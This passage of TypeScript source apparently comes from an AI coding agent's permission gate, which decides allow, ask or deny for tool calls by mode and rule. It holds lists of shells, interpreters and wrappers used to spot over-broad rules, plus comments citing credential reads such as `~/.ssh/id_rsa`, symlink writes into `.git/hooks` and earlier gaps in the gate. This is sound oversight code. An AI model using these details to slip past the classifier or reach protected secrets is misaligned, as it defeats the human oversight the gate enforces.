	return toAbsoluteFolded(candidate, cwd) === toAbsoluteFolded(dir, cwd) || isInsideDir(candidate, dir, cwd);
}

/**
 * Whether one rule matches a call. For bash this is the deny/ask ("any
 * subcommand") semantics — allow rules go through {@link findBashAllowRule}.
 */
export function ruleMatches(rule: PermissionRule, toolName: string, subject: string, cwd: string): boolean {
	if (!ruleCoversTool(rule.tool, toolName)) return false;
	if (!rule.pattern) return true;
	if (!subject) return false;
	switch (subjectKind(toolName)) {
		case "command":
			return normalizeToolName(toolName) === "powershell"
				? powershellPatternMatchesAny(rule.pattern, subject)
				: bashPatternMatchesAny(rule.pattern, subject);
		case "path":
			return matchesPathPattern(rule.pattern, subject, cwd);
		case "url":
			return matchesUrlPattern(rule.pattern, subject);
		case "text":
			// The agent catalog resolves names case-insensitively (Explore/explore).
			return globToRegex(rule.pattern, false, normalizeToolName(toolName) === "Agent").test(subject);
	}
}

/**
 * Whether a rule's tool covers a call's tool: the same name, or Claude Code's
 * server-wide MCP forms — `mcp__github` and `mcp__github__*` cover every tool
 * on that server, and `mcp__plugin:x:server` is the plugin-namespaced form.
 * A rule naming a specific tool (`mcp__github__delete_repo`, two `__` groups)
 * stays exact. Until
 * 2026-09-05 the server-wide spelling, the natural way to keep an agent off a
 * server, matched nothing (PERMISSIONS-REVIEW-2026-09-05 M3).
 */
export function ruleCoversTool(ruleTool: string, toolName: string): boolean {
	const tool = normalizeToolName(toolName);
	if (ruleTool === tool) return true;
	if (!ruleTool.startsWith("mcp__")) return false;
	const wildcard = ruleTool.endsWith("__*");
	const prefix = wildcard ? ruleTool.slice(0, -3) : ruleTool;
	const server = prefix.slice("mcp__".length);
	return server.length > 0 && (wildcard || !server.includes("__")) && tool.startsWith(`${prefix}__`);
}

/** Risk tier drives the unmatched-rule default. */
export type ToolTier = "safe" | "edit" | "execute" | "custom";

const SAFE_TOOLS = new Set(["read", "grep", "find", "ls"]);
const EDIT_TOOLS = new Set(["edit", "write", "notebook_edit"]);

export function toolTier(toolName: string): ToolTier {
	const name = normalizeToolName(toolName);
	if (SAFE_TOOLS.has(name)) return "safe";
	if (EDIT_TOOLS.has(name)) return "edit";
	if (isShellToolName(name)) return "execute";
	return "custom";
}

/**
 * Whether a tool's subject is a filesystem path whose RESOLVED form the gate
 * judges (protected paths, working-directory containment): the writing tools
 * and the read tier. A bash subject is a command line; a custom tool's is
 * whatever pathArgument found, not necessarily a path. Callers pass
 * `resolveForContainment(toAbsolute(...))` as `resolvedSubject` for these only.
 */
export function isPathSubjectTool(toolName: string): boolean {
	const name = normalizeToolName(toolName);
	return isWritingTool(name) || toolTier(name) === "safe" || READS_A_PATH.has(name);
}

/**
 * Custom-tier tools that read the file their path argument names: `artifact`
 * copies its source page into the store and opens it in the browser. They stay
 * gated like any custom tool, and the read-path rules apply on top:
 * `blockReadsOutsideWorkingDirectories` refuses an outside path, and no allow
 * rule covers one (the mode decides).
 */
const READS_A_PATH = new Set(["artifact"]);

/**
 * Tools that never need approval: they change no state outside the session and
 * touch no network or filesystem the user hasn't already opted into.
 *
 * `tool_search` and `skill` matter more than they look — gating them breaks
 * deferred tool loading and skill invocation entirely in non-interactive runs,
 * since a blocked loader means the model can never reach the tools behind it.
 */
export const AUTO_ALLOWED_TOOLS = new Set<string>([
	"ask_user_question",
	"ask_user",
	// Loads tool schemas and packaged instructions; no side effects.
	"tool_search",
	"skill",
	// Read-only inspection.
	"lsp_diagnostics",
	"list_mcp_resources",
	"list_agents",
	// Subagent orchestration is safe to launch; each child enforces its own
	// tool permissions via the in-process permission gate.
	"Agent",
	// Same reasoning for workflow: the script itself cannot touch the
	// filesystem, network, or shell — only spawn agents, and every one of those
	// runs behind the workflow permission gate.
	"workflow",
	// Plan-mode transitions must work inside plan mode itself.
	"enter_plan_mode",
	"exit_plan_mode",
	// Session-state bookkeeping.
	"task_create",
	"task_get",
	"task_list",
	"task_update",
	// Inspecting/stopping background work this session already started.
	"task_output",
	"task_stop",
	// The session's cron store: timers that replay a prompt, and listing and
	// cancelling them. (schedule_wakeup and cron_create are here for every mode
	// but auto, where CLASSIFY_IN_AUTO_TOOLS sends them to the classifier.)
	"schedule_wakeup",
	"cron_list",
	"cron_delete",
	"cron_create",
	// Resumes/messages an agent — same reasoning as Agent: the child enforces its
	// own tool permissions. (monitor and enter/exit_worktree stay gated: they
	// run arbitrary shell commands / mutate the filesystem.)
	"SendMessage",
]);

/** The profile's switch for a tool: it keys tools by their registered name, so the raw and the normalized spelling are both looked up. */
const switchFor = (rawName: string, tool: string) => toolSwitch(rawName) ?? toolSwitch(tool);

/**
 * A tool that runs without approval: the base's set, plus any the profile
 * marks `autoAllow` (lib/profile/profile.ts). The profile keys tools by their
 * registered name, so both the raw and the normalized spelling are looked up.
 * Plan mode does not use this: the base's set is plan-safe by construction,
 * a product's auto-allowed tool need not be.
 */
export function isAutoAllowedTool(rawName: string, tool: string = normalizeToolName(rawName)): boolean {
	return AUTO_ALLOWED_TOOLS.has(tool) || switchFor(rawName, tool)?.autoAllow === true;
}

export interface DecideInput {
	toolName: string;
	subject: string;
	cwd: string;
	mode: PermissionMode;
	deny: PermissionRule[];
	ask: PermissionRule[];
	allow: PermissionRule[];
	/** Auto mode: route every shell command through the classifier, ignoring narrow Bash allow rules. */
	classifyAllShell?: boolean;
	/**
	 * The subject with symlinks resolved (see lib/shell/paths.ts), when the
	 * caller could resolve it. The protected-path check consults it as well as
	 * the literal spelling, so writing through `ln -s .git/hooks build` is as
	 * protected as writing `.git/hooks` directly. Kept a separate input so this
	 * module stays pure — resolution touches the filesystem.
	 */
	resolvedSubject?: string;
	/**
	 * Plan mode's one writable file (see extensions/safety/plan-mode). Absolute or
	 * ~-prefixed; writes whose subject resolves to it are allowed even in plan
	 * mode.
	 */
	planFilePath?: string;
	/**
	 * The session's auto-memory directory (see extensions/context/memory). Absolute or
	 * ~-prefixed; writes landing inside it are allowed — the system prompt
	 * itself instructs them — though deny and ask rules still win.
	 */
	memoryDirPath?: string;
	/**
	 * The session's scratchpad directory (see extensions/lib/scratchpad); the
	 * system prompt directs all temp files there, with the same treatment as
	 * the memory dir.
	 */
	scratchpadDirPath?: string;
	/**
	 * The working directory's own resolved form (`resolveForContainment(cwd)`),
	 * when the caller could resolve it. A resolved subject is compared against
	 * it as well as the literal cwd: on macOS a project under `/var/folders`
	 * resolves to `/private/var/folders`, and without this every in-project
	 * path read as outside the working directory. Kept an input so this module
	 * stays pure.
	 */
	resolvedCwd?: string;
	/**
	 * Where the session persists oversized tool outputs (`lib/request/persisted-output.ts
	 * sessionResultsDir`). Readable like the working directory: the model is
	 * told to read those files back.
	 */
	resultsDirPath?: string;
	/**
	 * This project's pi session directory (`<agentDir>/sessions/<encoded-cwd>`):
	 * the session transcripts and, next to them, auto mode's decision log.
	 * Readable like the working directory — Claude Code lets a session read
	 * its own project directory under its config root, which is where its
	 * transcripts live (`checkReadableInternalPath`, "Project directory files
	 * are allowed for reading"), and /doctor's evidence gathering depends on
	 * it. Other projects' session directories are not in the set. Never a
	 * write root: the agent dir stays protected.
	 */
	sessionDirPath?: string;
	/**
	 * Directories protected at runtime, beyond the static list in
	 * protected-paths.ts (see `runtimeProtectedDirs()`, the sole producer): pi's
	 * own agent directory (`getAgentDir()` — `~/.pi/agent` for stock pi,
	 * `~/.onecode/agent` bundled), Claude Code's config dir (`claudeConfigDir()`)
	 * and One Code's state dir (`productStateDir()`). The last two catch a
	 * relocated `CLAUDE_CONFIG_DIR` / `ONECODE_STATE_DIR`, which the static
	 * segment list cannot (distribution review 2026-09-09, L2). The session's
	 * settings files ride here too (`runtimeProtectedFiles()`): a source
	 * provider may add one under a name the static list does not know.
	 * Absolute paths; a write landing at or inside one is judged like a
	 * protected path (PERMISSIONS-REVIEW-2026-09-05 M7).
	 */
	protectedDirs?: string[];
	/**
	 * The harness's own secret stores (`lib/agents/permission-gate.ts
	 * runtimeSecretPaths`, the sole producer): files, and directories judged
	 * with everything under them. Absolute, literal and resolved. Outside the
	 * working space they count as credential paths, like the basename
	 * denylist: a read tool never reads one unclassified, and a workspace
	 * directory does not make one working space.
	 */
	secretPaths?: string[];
	/**
	 * The workspace directories in force (safety/permissions/workspace.ts), absolute and
	 * resolved. A read inside one is a working-space read, and acceptEdits may
	 * write inside one, as in Claude Code; a credential path inside one is not
	 * working space. Auto mode's unclassified writes stay confined to the working
	 * directory (the classifier's containment fast path never sees these).
	 */
	workspaceDirs?: string[];
	/**
	 * The calling model is frontier or workhorse tier, so its calls get Claude
	 * Code's fast paths (`lib/models/model-tier.ts usesClaudeCodeFastPaths`). Absent is
	 * the stricter gate cheap and tiny models keep.
	 */
	claudeCodeFastPaths?: boolean;
	/**
	 * PowerShell's own parse of a `powershell` subject (lib/shell/powershell-parser.ts),
	 * made by the caller before deciding. Absent, no PowerShell line is read-only
	 * or a contained edit here: the gate clears nothing it has not parsed.
	 */
	powershellParse?: PowerShellParse;
	/**
	 * Claude Code's `permissions.blockReadsOutsideWorkingDirectories`: the read
	 * tools refuse a path outside the working space, in every mode.
	 */
	blockReadsOutsideWorkingDirectories?: boolean;
	/**
	 * Documentation the harness ships and reads (lib/agents/guide-docs.ts: One Code's
	 * user guide, the running pi's docs and examples), absolute and resolved.
	 * A read inside one is allowed like a working-directory read, on every model
	 * tier, so the `one-code-guide` agent reads them without a prompt. Never a
	 * write root: only read checks consult it (`workingSpaceHolds` with `reads`).
	 */
	readOnlyDirs?: string[];
}

export interface Decision {
	decision: PermissionDecision;
	/** Rule that determined the outcome, when one did. */
	rule?: PermissionRule;
	/** Why, for deny/ask decisions surfaced to the model or user. */
	cause:
		| "rule"
		| "plan-mode"
		| "plan-file"
		| "plan-readonly"
		/**
		 * Plan mode: a shell line the pre-gate could not prove read-only and that
		 * names no write, put to the user (an ask rule may have matched, `rule`).
		 * Never handed to the classifier; with no user to answer, refused with the
		 * plan-mode text.
		 */
		| "plan-unproven"
		| "memory-dir"
		| "scratchpad-dir"
		| "mode"
		| "tier"
		| "protected-path"
		/** A shell command the read-only check proves reads only inside the working space. */
		| "read-only"
		/** A read tool outside the working space, allowed unclassified in auto mode (Claude Code's safe allowlist). */
		| "outside-read"
		/** A read tool outside the working space, refused by `blockReadsOutsideWorkingDirectories`. */
		| "blocked-outside-read"
		/** A read, or an acceptEdits write, whose path is outside the working directory. */
		| "working-dir"
		/** A tool the profile turned off (lib/profile/profile.ts). */
		| "profile-disabled"
		/** A file tool on one of the profile's secret files, or a command that names one (lib/profile/secrets.ts). */
		| "secret-file";
}

/**
 * Custom-tier tools that only read (the network or MCP resources) and so stay
 * available in plan mode, as WebFetch/WebSearch do in Claude Code. Everything
 * else custom is treated as a mutation there.
 */
const PLAN_READ_ONLY_TOOLS = new Set(["web_fetch", "web_search", "list_mcp_resources", "read_mcp_resource", "read_mcp_resource_dir"]);

/**
 * A custom-tier tool plan mode lets run: the base's set, plus a product's own
 * tool its profile marks `readOnly` (refused at load on a base tool). Looked
 * up under both spellings, like `isAutoAllowedTool`.
 */
function isPlanReadOnlyTool(rawName: string, tool: string): boolean {
	return PLAN_READ_ONLY_TOOLS.has(tool) || switchFor(rawName, tool)?.readOnly === true;
}

/**
 * Tools that launch a fresh agent loop. In auto mode these are classified
 * rather than auto-allowed, so the delegated task is judged before the child
 * starts — a child cannot be trusted to refuse a task its parent should not have
 * handed it, and Claude Code evaluates the task description at spawn time for
 * the same reason. Outside auto mode they stay auto-allowed: each child enforces
 * its own permissions by inheriting the mode. `SendMessage` is a delegation
 * too: a new task handed to a resident agent after its spawn was judged is a
 * new delegation, and until 2026-09-05 it was never classified
 * (PERMISSIONS-REVIEW-2026-09-05 L4).
 */
const DELEGATION_TOOLS = new Set(["Agent", "workflow", "SendMessage"]);

/**
 * Allowed in every mode but auto, where the classifier reviews them: Claude
 * Code's `CronCreate` and `ScheduleWakeup` (findings §21: "Scheduling a cron
 * prompt requires classifier review", "Scheduling a /loop wakeup requires
 * classifier review"). A scheduled prompt replays later with nobody watching,
 * so the classifier judges what it asks for. Unlike DELEGATION_TOOLS, an allow
 * rule for one still applies in auto mode.
 */
const CLASSIFY_IN_AUTO_TOOLS = new Set(["cron_create", "schedule_wakeup"]);

/**
 * How a program runs other code, which decides what an allow rule for it
 * grants. The one list behind both auto mode's broad-rule filter
 * (`isBroadExecutionRule`) and plan mode's runner check (`runsOtherCode`), so
 * the two cannot drift:
 *
 * - `shell`, `interpreter`: its arguments, script files or stdin are code. Any
 *   wildcarded rule for one is broad, and so is an exact rule that gives it no
 *   operand to run (`Bash(sh)`, `Bash(bash -s)`), since piped input is code.
 * - `wrapper`: runs another command it is handed (privilege changers, exec
 *   and environment wrappers, remote and sandbox runners). Any wildcarded rule
 *   for one is broad.
 * - `toolchain`: a package manager or build tool whose own escape hatch runs
 *   code (`npm run *`, `npx *`, `make *`). Broad only for those shapes, so
 *   `Bash(npm test:*)` still skips the classifier in auto mode.
 * - `plan`: runs code another way (a test or task runner, an editor or pager
 *   with a shell escape, a database client, a scheduler, a builtin that
 *   changes what a later word runs). Plan mode only: in auto mode a rule for
 *   one keeps skipping the classifier, as it did before this list existed.
 *
 * Names are basenames, lowercased; `runnerKind` also tries the name without a
 * trailing version (`python3.12`, `perl5.34`, `zsh-5.9`) and the part before
 * its first `-` (`docker-compose`, `ssh-agent`). Missing a name here lets a
 * user's rule for that program skip the check, so the list errs wide.
 */
type RunnerKind = "shell" | "interpreter" | "wrapper" | "toolchain" | "plan";
const RUNNER_GROUPS: Record<RunnerKind, readonly string[]> = {
	shell: ["bash", "sh", "zsh", "fish", "dash", "ksh", "mksh", "tcsh", "csh", "ash", "pwsh", "powershell", "cmd", "wsl"],
	interpreter: [
		"python", "pypy", "node", "nodejs", "deno", "tsx", "ts-node", "ruby", "irb", "perl", "php", "lua", "luajit", "osascript", "tclsh",
		"wish", "expect", "r", "rscript", "julia", "swift", "groovy", "scala", "kotlin", "elixir", "erl", "escript", "ghci", "runghc",
		"jshell", "jjs", "awk", "gawk", "mawk", "nawk", "dc", "bc", "m", "gnuplot", "octave", "source", ".", "eval",
	],
	wrapper: [
		"exec", "env", "xargs", "nohup", "setsid", "timeout", "time", "nice", "ionice", "stdbuf", "flock", "script", "command", "builtin",
		"sudo", "doas", "su", "runuser", "pkexec", "chroot", "nsenter", "unshare", "fakeroot", "firejail", "sandbox-exec", "watch",
		"busybox", "parallel", "caffeinate", "taskset", "unbuffer", "chronic", "dbus-run-session", "xvfb-run", "arch", "xcrun", "ssh",
		"strace", "ltrace", "valgrind", "gdb", "lldb", "hyperfine", "direnv", "mise", "asdf", "nix-shell", "nix", "entr",
		"invoke-expression", "invoke-command", "start-process", "start-job",
	],
	toolchain: [
		"npm", "npx", "pnpm", "pnpx", "yarn", "bun", "bunx", "uv", "uvx", "pip", "poetry", "cargo", "go", "dotnet", "java", "mvn", "gradle",
		"make", "docker", "kubectl",
	],
	plan: [
		"sed", "vim", "vi", "nvim", "view", "ex", "emacs", "ed", "nano", "less", "more", "most", "man", "rake", "just", "ninja", "cmake",
		"bazel", "ant", "sbt", "lein", "mix", "composer", "bundle", "gem", "pipx", "conda", "mamba", "rustup", "podman", "nerdctl",
		"vagrant", "terraform", "ansible", "ansible-playbook", "tmux", "screen", "at", "batch", "crontab", "systemd-run", "launchctl",
		"open", "xdg-open", "nodemon", "swiftc", "sqlite", "psql", "mysql", "pdflatex", "latex", "xelatex", "lualatex", "luatex", "tex",
		"pandoc", "fzf", "brew", "pytest", "tox", "pre-commit", "turbo", "nx", "ssh-agent", "hash", "alias", "unalias", "enable", "set",
		"shopt", "trap", "export", "declare", "typeset", "readonly", "local",
	],
};
const RUNNERS = new Map<string, RunnerKind>(
	(Object.entries(RUNNER_GROUPS) as [RunnerKind, readonly string[]][]).flatMap(([kind, names]) => names.map((name) => [name, kind] as const)),
);

/** How the program `name` (a basename, lowercased) runs other code, if it does. */
function runnerKind(name: string): RunnerKind | undefined {
	const unversioned = name.replace(/-?[0-9][0-9.]*$/, "");
	for (const candidate of [name, unversioned, name.split("-")[0], unversioned.split("-")[0]]) {
		const kind = candidate ? RUNNERS.get(candidate) : undefined;
		if (kind) return kind;
	}
	return undefined;
}

/** Whether the program `name` (a basename, lowercased) runs other programs or code it is given: plan mode's check. */
function runsOtherCode(name: string): boolean {
	return runnerKind(name) !== undefined;
}

/**
 * An allow rule broad enough to grant arbitrary code execution. Auto mode
 * suspends these (the rule is ignored and the call takes the fast paths, then
 * the classifier) — a blanket `Bash` or a wildcarded interpreter would
 * otherwise hand the model a standing way past the classifier, which is the
 * one thing auto mode exists to prevent; plan mode ignores them too. Narrow
 * rules (`Bash(npm test:*)`) still resolve before the classifier unless
 * `classifyAllShell` is set.
 *
 * Broad: a blanket `Bash(*)`/`PowerShell(*)`, a pattern that starts with a
 * wildcard (`Bash(* *)`, `Bash(*-*)`), any wildcarded rule whose command is a
 * shell, an interpreter or a wrapper (`RUNNER_GROUPS`; spelled as a path or
 * with a version too), an exact rule that hands a shell or interpreter no
 * operand (`Bash(sh)`, `Bash(bash -s)`: piped input is code), a toolchain's
 * code escape (`npm run *`, `npx *`, `make *`), and `Agent`/`Task` rules.
 * Claude Code's own list (`DANGEROUS_BASH_PATTERNS`) is a subset in shapes and
 * names.
 */
export function isBroadExecutionRule(rule: PermissionRule): boolean {
	// Delegation rules are dropped outright: a subagent is a fresh agent loop, so
	// pre-approving one pre-approves whatever that loop decides to do.
	if (DELEGATION_TOOLS.has(rule.tool)) return true;
	if (!isShellToolName(rule.tool)) return false;

	if (!rule.pattern) return true;
	const pattern = rule.pattern.trim().toLowerCase();
	const wildcard = hasUnescapedWildcard(pattern);
	// A leading wildcard matches any command word: `*`, `:*`, `* *`, `*-*`.
	if (wildcard && /^(\*|:\*)/.test(pattern)) return true;

	const rawHead = pattern.split(/[\s*]/)[0] ?? "";
	// A PowerShell alias is as broad as its cmdlet: `PowerShell(iex *)` is
	// `Invoke-Expression *`, `PowerShell(saps *)` is `Start-Process *`.
	const bareHead = rawHead.replace(/:$/, "");
	const head = rule.tool === "powershell" ? canonicalCommandName(bareHead).toLowerCase() : bareHead;
	const kind = runnerKind(programName(head));
	if (!wildcard) {
		// An exact rule matches one command, which is narrow however powerful
		// that command is, unless it is a shell or interpreter given no operand
		// to run: then it runs whatever is piped into it.
		return (kind === "shell" || kind === "interpreter") && pattern.split(/\s+/).slice(1).every((word) => word.startsWith("-"));
	}
	if (kind === "shell" || kind === "interpreter" || kind === "wrapper") return true;
	if (kind !== "toolchain") return false;

	const rest = pattern.slice(rawHead.length).trim();
	// Nothing constrains the arguments: `npm *`, `make:*`.
	if (/^[:\s]*\*+$/.test(rest)) return true;
	// The runner's own escape hatch takes arbitrary code: `npm run *`, `npx *`.
	if (/^(run|exec|x)[:\s]*\*+$/.test(rest)) return true;
	// An inline-code flag takes arbitrary code: `java -e *`-style, quote-wrapped
	// spellings included (over-flagging only costs a classifier call).
	if (/^-(c|e)[\s:='"]*\*+['"]*$/.test(rest)) return true;
	// `npm test:*` names the script, so it stays narrow.
	return false;
}

export function decide(params: DecideInput): Decision {
	const { toolName, subject, cwd, mode, deny, ask, allow } = params;
	/**
	 * The harness's readable session dirs and the workspace directories,
	 * realpath'd, as the auto-mode pre-gate sees them (safety/permissions/index.ts
	 * `readableRoots`).
	 */
	const sessionReadableRoots = () => [
		...[params.memoryDirPath, params.scratchpadDirPath, params.resultsDirPath, params.sessionDirPath].filter((d): d is string => !!d).map((d) => resolveForContainment(d) ?? d),
		...(params.readOnlyDirs ?? []),
		...(params.workspaceDirs ?? []),
	];
	/** The auto-mode pre-gate's evidence for a shell command, as the permissions extension's pre-gate sees it. */
	const shellEvidence = (command: string, writableRoots?: string[]): ShellEvidence =>
		analyzeShellCommand({ command, cwd, home: homedir(), protectedDirs: params.protectedDirs, readableRoots: sessionReadableRoots(), writableRoots });
	/** A safe verdict with no writes is exactly read-only: a safe line may still redirect inside the project. */
	const isReadOnly = (evidence: ShellEvidence): boolean => evidence.verdict === "safe" && evidence.writes.length === 0;
	/** The pre-gate's proof that a command only reads inside the project, for a substitution in an allowed command. */
	const readOnlyShell = (command: string): boolean => isReadOnly(shellEvidence(command));
	/** The pre-gate's proof that a read-only command reads no file, only its stdin (`ShellEvidence.readsNoFile`). */
	const readsNoFileShell = (command: string): boolean => {
		const evidence = shellEvidence(command);
		return isReadOnly(evidence) && evidence.readsNoFile;
	};

	// In dontAsk mode anything that would prompt is denied instead — including
	// explicit ask rules: there is no user to put the question to.
	const askOrDeny = (rule?: PermissionRule): Decision => {
		if (mode === "dontAsk") return { decision: "deny", rule, cause: "mode" };
		return { decision: "ask", rule, cause: rule ? "rule" : "tier" };
	};

	const tool = normalizeToolName(toolName);
	// A tool the profile turned off is refused in every mode, bypass included:
	// it should never have been callable, whatever path it arrived by.
	if (isToolDisabled(toolName) || isToolDisabled(tool)) return { decision: "deny", cause: "profile-disabled" };

	// A secret file is refused in every mode, bypass included, before any rule
	// can allow it: the product's own tool is the only reader and writer. A
	// file tool is judged by its path; a bash command by whether its words or
	// redirects touch the file (lib/shell/secret-files.ts), so a command that
	// only mentions the name still runs; PowerShell, with no word-level parse
	// here, by the mention. The check is by name, so it steers rather than
	// seals; the values themselves are redacted (lib/profile/secrets.ts).
	const secretFiles = secretFileNames();
	if (subject && secretFiles.size > 0) {
		const kind = subjectKind(toolName);
		const named =
			kind === "command"
				? tool === "powershell"
					? commandNamesSecretFile(subject, secretFiles)
					: commandTouchesSecretFile(subject, secretFiles)
				: kind === "path" && [subject, params.resolvedSubject].some((path) => path !== undefined && isSecretFilePath(path, secretFiles));
		if (named) return { decision: "deny", cause: "secret-file" };
	}

	const denyRule = deny.find((r) => ruleMatches(r, toolName, subject, cwd));
	if (denyRule) return { decision: "deny", rule: denyRule, cause: "rule" };

	if (mode === "bypassPermissions") return { decision: "allow", cause: "mode" };

	/**
	 * Whether an absolute path is a credential: the basename denylist, or at or
	 * under one of the harness's own secret stores (`secretPaths`).
	 */
	const isCredential = (absolute: string): boolean =>
		isSensitivePath(absolute) || (params.secretPaths ?? []).some((secret) => isAtOrInsideDir(absolute, secret, cwd));
	/**
	 * Whether `target` (where `spelled` resolves) is working space: the working
	 * directory, the harness's session dirs, the plan file, and the workspace
	 * directories except for the credentials in them. For a read (`reads`), the
	 * shipped docs folders (`readOnlyDirs`) count too; they are never written.
	 */
	const workingSpaceHolds = (spelled: string, target: string, workspace = true, reads = false): boolean => {
		const roots = [cwd, params.resolvedCwd, params.memoryDirPath, params.scratchpadDirPath, params.resultsDirPath, params.sessionDirPath, ...(reads ? (params.readOnlyDirs ?? []) : [])];
		if (roots.some((dir) => dir && isAtOrInsideDir(target, dir, cwd))) return true;
		// A workspace directory is working space except for the credentials in it:
		// adding a directory must not make its keys readable without a prompt.
		// Judged on the spelling and on where it resolves, so a symlink cannot
		// launder a credential in either direction.
		const sensitive = [spelled, target].some((candidate) => isCredential(toAbsolute(cwd, candidate, homedir())));
		if (workspace && !sensitive && (params.workspaceDirs ?? []).some((dir) => isAtOrInsideDir(target, dir, cwd))) return true;
		return params.planFilePath ? isPlanFilePath(target, params.planFilePath, cwd) : false;
	};
	/** Whether a path is protected: the static list or a runtime-protected directory. */
	const isProtected = (...candidates: (string | undefined)[]) =>
		candidates.some(
			(candidate) =>
				candidate &&
				(isProtectedPath(candidate, cwd) || (params.protectedDirs ?? []).some((dir) => isAtOrInsideDir(candidate, dir, cwd))),
		);
	/**
	 * Whether a redirect on the line reads or writes outside the working space,
	 * onto a protected path, or somewhere only known at runtime (an expansion,
	 * a glob, `~user`, or a relative target after a `cd`).
	 */
	const redirectEscapes = (command: string): boolean => {
		const { segments, parseFailed } = parseCommand(command.trim());
		// A line that did not parse may hide a redirect the segments dropped.
		if (parseFailed) return /[<>]/.test(command);
		const home = homedir();
		// Only a `cd` before a redirect moves where its relative target lands.
		let moved = false;
		for (const segment of segments) {
			if (movesDirectory(segment)) moved = true;
			const targets = [...segment.redirects.map((value) => ({ value, write: true })), ...segment.inputs.map((token) => ({ value: token.value, write: false }))];
			if (targets.length > 0 && segment.unknownTarget) return true;
			for (const { value: target, write } of targets) {
				if (DEVICE_TARGETS.has(target) || target.startsWith("/dev/fd/")) continue;
				if (isUnknownTilde(target) || /[*?[]/.test(target)) return true;
				if (moved && !isAbsolute(target) && !target.startsWith("~")) return true;
				const absolute = toAbsoluteBash(cwd, target, home);
				const resolved = resolveForContainment(absolute) ?? absolute;
				// Auto mode's unclassified writes stay in the working directory, a
				// workspace directory's included (decisions/modes.md).
				if (!workingSpaceHolds(target, resolved, !(write && mode === "auto"), !write)) return true;
				if (isProtected(absolute, resolved)) return true;
			}
		}
		return false;
	};

	/**
	 * Whether a stage after the first of a pipeline on the line is not provably
	 * read-only by itself. A program reading a pipe may run what it reads (a
	 * shell, `perl5.34`, `dc`, `sqlite3 db`), and no list of such programs is
	 * complete, so in plan mode an allow rule covers only a line whose later
	 * stages the pre-gate clears on their own (`gh pr view 1 | head`).
	 */
	const pipesIntoUnproven = (command: string): boolean => {
		const { segments, pipelines, parseFailed } = parseCommand(command.trim());
		if (parseFailed) return true;
		const fed = new Set(pipelines.flatMap((members) => members.slice(1)));
		return segments.some((segment) => segment.scopes.some((scope) => fed.has(scope)) && !readOnlyShell(segment.raw));
	};

	/**
	 * Plan mode's answer for a shell line (bash, PowerShell), in this order:
	 *
	 * 1. A write the line names is refused: never asked about, never allowed
	 *    by a rule.
	 * 2. An ask rule asks, before the read-only allowance, as in the other modes.
	 * 3. A provably read-only line runs (`plan-readonly`); a read-only line that
	 *    reads outside the working directory is put to the user as a read.
	 * 4. An allow rule allows, matched as the other modes match it (every
	 *    subcommand in its literal spelling, never a redirect outside the
	 *    working space), but only for a line whose one objection is a program
	 *    the pre-gate knows nothing about (`ruleMayCover`: `gh`, not `sed -i`,
	 *    `git push` or `cat ~/.ssh/id_rsa`) and that runs no program which runs
	 *    other code (`runsOtherCode`), and never by a rule broad enough to run
	 *    anything (`isBroadExecutionRule`). A rule names a command, not what
	 *    its options do, so a known command that failed its table, or a runner
	 *    whose arguments are code, would let a rule approve a write the gate
	 *    cannot see.
	 * 5. Anything else is put to the user.
	 *
	 * An unproven line's ask carries `plan-unproven`: it goes to the user,
	 * never to auto mode's classifier (the mode is plan, so nothing below the
	 * plan branch runs), and with no user to answer it the caller refuses it
	 * with the plan-mode text. `ruleMayCover` is a thunk: it parses the line
	 * again, so it runs only when step 4 is reached.
	 */
	const planShellLine = (line: { writes: boolean; readOnly: boolean; readOnlyOutside: boolean; ruleMayCover: () => boolean }): Decision => {
		if (line.writes) return { decision: "deny", cause: "plan-mode" };
		const askRule = ask.find((r) => ruleMatches(r, toolName, subject, cwd));
		if (askRule) return line.readOnly || line.readOnlyOutside ? askOrDeny(askRule) : { decision: "ask", rule: askRule, cause: "plan-unproven" };
		if (line.readOnly) return { decision: "allow", cause: "plan-readonly" };
		if (line.readOnlyOutside) return { decision: "ask", cause: "working-dir" };
		if (line.ruleMayCover() && !(tool === "bash" && redirectEscapes(subject))) {
			const allowRule = findBashAllowRule(
				allow.filter((rule) => !isBroadExecutionRule(rule)),
				subject,
				tool,
				{ readOnly: readOnlyShell, readsNoFile: readsNoFileShell },
			);
			if (allowRule) return { decision: "allow", rule: allowRule, cause: "rule" };
		}
		return { decision: "ask", cause: "plan-unproven" };
	};

	const tier = toolTier(toolName);
	if (mode === "plan" && tier !== "safe" && !AUTO_ALLOWED_TOOLS.has(tool)) {
		// Plan mode's one writable file (~/.onecode/plans/<slug>.md, which
		// protected-paths already excepts as working space).
		const planFile = params.planFilePath;
		if (planFile && isWritingTool(normalizeToolName(toolName)) && subject) {
			const planTarget =
				isPlanFilePath(subject, planFile, cwd) ||
				(params.resolvedSubject ? isPlanFilePath(params.resolvedSubject, planFile, cwd) : false);
			if (planTarget) return { decision: "allow", cause: "plan-file" };
		}
		// Read-only bash stays usable while planning (Claude Code permits it). The
		// auto-mode shell pre-gate's "safe" verdict means "every command is on the
		// read-only allowlist, nothing leaves the project" — plus in-project
		// redirect writes, which it records; a safe verdict with no writes is
		// exactly read-only. A line it cannot vouch for takes `planShellLine`:
		// refused when it names a write, otherwise a rule or the user decides.
		// Without this the frontier tier (no grep/find/ls) was left with `read` alone.
		// The harness's readable session dirs, as the auto-mode pre-gate sees them
		// (safety/permissions/index.ts `readableRoots`): a plan-mode read of this project's
		// transcripts is a read like any other.
		const readableRoots = sessionReadableRoots();
		if (tool === "bash" && subject) {
			const evidence = shellEvidence(subject);
			return planShellLine({
				writes: namesWrite(evidence),
				readOnly: isReadOnly(evidence),
				// Read-only, but of a path outside the working directory: still a
				// read, put to the user as the read tools' outside read is.
				readOnlyOutside: evidence.readOnlyOutside && evidence.writes.length === 0,
				ruleMayCover: () => evidence.unlistedOnly && evidence.commands.every((name) => !runsOtherCode(programName(name))) && !pipesIntoUnproven(subject),
			});
		}
		// The PowerShell counterpart, judged from PowerShell's own parse
		// (powershell-tree.ts). A line PowerShell has not parsed is refused:
		// without the parse no write in it can be seen, and the gate clears
		// nothing it has not parsed.
		if (tool === "powershell" && subject) {
			const parse = params.powershellParse;
			if (!parse) return { decision: "deny", cause: "plan-mode" };
			return planShellLine({
				writes: powershellTreeNamesWrite(parse),
				readOnly: powershellReadOnly({ parse, cwd, home: homedir(), readableRoots }).readOnly,
				readOnlyOutside: false,
				ruleMayCover: () => powershellTreeUnlistedOnly(parse, { cwd, home: homedir() }, (name) => !gateKnowsCommand(name) && !runsOtherCode(name)),
			});
		}
		if (isPlanReadOnlyTool(toolName, tool)) {
			const askRule = ask.find((r) => ruleMatches(r, toolName, subject, cwd));
